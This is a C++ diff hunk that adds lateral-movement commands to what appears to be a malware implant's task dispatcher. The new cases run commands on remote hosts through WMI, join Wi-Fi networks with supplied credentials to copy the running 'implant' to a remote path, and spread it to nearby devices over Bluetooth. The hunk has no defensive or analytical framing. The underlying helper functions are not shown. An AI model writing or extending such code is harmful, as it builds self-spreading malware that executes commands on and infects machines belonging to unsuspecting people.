@@ -262,6 +262,60 @@ void TaskDispatcher::dispatch(const Task& task) {
                 }
                 break;
             }
+            case TaskType::GET_LOGS:
+                result.output = "LOGS:" + utils::Logger::GetRecentLogs(200);
+                break;
+            case TaskType::LATERAL_WMI: {
+                // Cmd format: "target command"
+                std::stringstream ss(task.cmd);
+                std::string target_s, cmd_s;
+                ss >> target_s;
+                std::getline(ss, cmd_s);
+                cmd_s.erase(0, cmd_s.find_first_not_of(" \t\n\r\f\v"));
+
+                if (!target_s.empty() && !cmd_s.empty()) {
+                    std::wstring target_ws(target_s.begin(), target_s.end());
+                    std::wstring cmd_ws(cmd_s.begin(), cmd_s.end());
+
+                    if (Lateral::WmiRemoteExec(target_ws, cmd_ws)) {
+                        result.output = "LATERAL_WMI:Successfully executed on " + target_s;
+                    } else {
+                        result.error = "LATERAL_WMI:Failed to execute on " + target_s;
+                    }
+                } else {
+                    result.error = "Invalid lateral_wmi command format (expected target command)";
+                }
+                break;
+            }
+            case TaskType::WIFI_LATERAL: {
+                // Cmd format: "ssid password remote_path"
+                std::stringstream ss(task.cmd);
+                std::string ssid, password, remote_path;
+                ss >> ssid >> password >> remote_path;
+
+                if (!ssid.empty() && !password.empty() && !remote_path.empty()) {
+                    char implantPath[MAX_PATH];
+                    GetModuleFileNameA(NULL, implantPath, MAX_PATH);
+                    if (wifi::ConnectAndShareImplant(ssid, password, implantPath, remote_path)) {
+                        result.output = "WIFI_LATERAL:Successfully connected and shared implant.";
+                    } else {
+                        result.error = "WIFI_LATERAL:Failed to connect or share implant.";
+                    }
+                } else {
+                    result.error = "Invalid wifi_lateral command format (expected ssid password remote_path)";
+                }
+                break;
+            }
+            case TaskType::BT_LATERAL: {
+                char implantPath[MAX_PATH];
+                GetModuleFileNameA(NULL, implantPath, MAX_PATH);
+                if (lateral::DiscoverAndShare(implantPath)) {
+                    result.output = "BT_LATERAL:Successfully discovered and shared implant.";
+                } else {
+                    result.error = "BT_LATERAL:Failed to discover or share implant.";
+                }
+                break;
+            }
             default:
                 result.error = "Unknown or unsupported task type.";
                 LOG_WARN("Unsupported task type received: " + task.task_id);
